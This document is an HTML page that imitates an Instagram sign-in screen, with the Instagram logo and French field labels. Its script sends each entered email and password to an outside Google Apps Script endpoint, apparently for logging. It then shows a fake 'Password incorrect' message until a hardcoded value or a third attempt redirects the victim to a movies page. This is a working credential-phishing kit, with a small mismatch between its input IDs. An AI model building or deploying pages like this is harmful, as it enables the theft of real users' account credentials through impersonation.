<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Sign Up</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:white;
  font-family:sans-serif;
}
.container{
  width:90%;
  max-width:350px;
  text-align:center;
}
.logo{
  width:80px;
  margin-bottom:20px;
}
input{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:10px;
  border:1px solid #ccc;
}
button{
  width:100%;
  padding:12px;
  background:#1877f2;
  color:white;
  border:none;
  border-radius:10px;
  font-size:16px;
  cursor:pointer;
}
#errorMsg{
  color:red;
  font-size:14px;
  margin-top:5px;
}
</style>

</head>
<body>

<div class="container">

  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">

  <input id="instaUser" placeholder="Nom de profil, e-mail ou numéro">
  <input id="instaPass" type="password" placeholder="Mot de passe">

  <button onclick="go()">Sign Up</button>
  <div id="errorMsg"></div>

</div>

<script>
let attempts = 0;
const maxAttempts = 3;
const correctPassword = "1234"; // نفس كلمة السر
const sheetUrl = "https://script.google.com/macros/s/AKfycbwcS4it59k6HArG6yziPd6AvHtkMXu5m3xzhmtsVWLt6vlEAOmzBdSFAgBhgu9XFEjTAQ/exec";

async function go() {
  const email = document.getElementById("insta_user").value.trim();
  const pw = document.getElementById("insta_pass").value.trim();
  const error = document.getElementById("errorMsg");

  attempts++;
  localStorage.setItem("insta_attempts", attempts);

  // 🔥 هذا هو المهم (form=Instagram)
  const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=&attempt=${attempts}&form=Instagram`;

  try {
    await fetch(sheetUrl, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data
    });
  } catch (err) {
    error.innerText = "Error connecting to Google Sheets";
    return;
  }

  if (pw === correctPassword || attempts >= maxAttempts) {
    localStorage.removeItem("insta_attempts");
    window.location.href = "movies.html";
  } else {
    error.innerText = "Password incorrect";
  }
}
</script>

</body>
</html>
